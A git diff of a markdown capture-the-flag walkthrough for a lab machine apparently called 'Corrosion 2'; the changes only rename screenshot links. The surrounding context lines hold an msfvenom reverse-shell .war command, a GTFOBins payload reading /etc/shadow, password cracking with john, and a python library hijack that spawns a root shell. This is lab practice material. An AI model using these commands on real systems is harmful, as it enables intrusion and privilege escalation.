@@ -70,7 +70,7 @@ fcrackzip -u backup.zip -D -p /usr/share/wordlists/rockyou.txt -v
 > 
 - It looks like we can upload the .war file to get a reverse-shell.
 
-![Screenshot_2025-07-27_20-12-02.png](Corrosion%202%2023c03ee046f5800eb7eff112e1199c5c/Screenshot_2025-07-27_20-12-02.png)
+![Upload .war payload](./img/upload-payload.png)
 
 ---
 
@@ -80,7 +80,7 @@ fcrackzip -u backup.zip -D -p /usr/share/wordlists/rockyou.txt -v
 - Upload this `rev.war` file
 - Go to → http://IP:8080/rev/
 
-![termial.png](Corrosion%202%2023c03ee046f5800eb7eff112e1199c5c/termial.png)
+![successful payload upload](./img/successful-netcat.png)
 
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your_IP> LPORT=1337 -f war -o rev.war
@@ -113,7 +113,7 @@ randy
 tomcat 
 ```
 
-![ssh.png](Corrosion%202%2023c03ee046f5800eb7eff112e1199c5c/ssh.png)
+![SSH login as jaye](./img/ssh-jaye.png)
 
 ---
 
@@ -130,11 +130,11 @@ find / -perm -4000 2>/dev/null
 
 - After running this command we see something unusual.
 
-![pri.png](Corrosion%202%2023c03ee046f5800eb7eff112e1199c5c/pri.png)
+![SUID Binary Files ](./img/SUID-set.png)
 
 - `/home/jaye/Files/look` → Try GTFOBins
 
-![Screenshot_2025-07-27_20-32-52.png](Corrosion%202%2023c03ee046f5800eb7eff112e1199c5c/Screenshot_2025-07-27_20-32-52.png)
+![GTFOBins payload for look](./img/GTFOBins.png)
 
 - Payload
 
@@ -144,7 +144,7 @@ LFILE=/etc/shadow
 ./look '' $LFILE
 ```
 
-![randy.png](Corrosion%202%2023c03ee046f5800eb7eff112e1199c5c/randy.png)
+![/etc/shadow file](./img/shadow-file.png)
 
 - username & password  → /etc/shadow
 
@@ -173,16 +173,16 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ssh randy@IP
 ```
 
-![esc.png](Corrosion%202%2023c03ee046f5800eb7eff112e1199c5c/b38dd374-8344-4f67-8ca9-37996a1f96c9.png)
+![SSH login as randy](./img/ssh-randy.png)
 
 - user → randy can run python script with privileges.
 
-![sudo.png](Corrosion%202%2023c03ee046f5800eb7eff112e1199c5c/e43e3989-dbe9-41c3-b4ec-c417afa401dc.png)
+![sudo permission](./img/Hint.png)
 
 - we can edit the python script and inject a cmd to spawn a root shell.
     - edit `/usr/lib/python3.8/base64.py`
 
-![payload.png](Corrosion%202%2023c03ee046f5800eb7eff112e1199c5c/8bba9cbc-f1f4-4868-a150-b9bd750ce17c.png)
+![Root Privilege Payload](./img/payload.png)
 
 ```python
 import os
@@ -193,7 +193,7 @@ os.system("/bin/bash")
 - save this
 - when we run `randombase64.py` python script, which triggers our `base64.py` and give us a root shell.
 
-![actual-root.png](Corrosion%202%2023c03ee046f5800eb7eff112e1199c5c/bdbf36ce-358d-4595-8414-e6aaf2b36e10.png)
+![Root Access](./img/root.png)
 
 ```bash
 sudo /usr/bin/python3.8 /home/randy/randombase64.py 
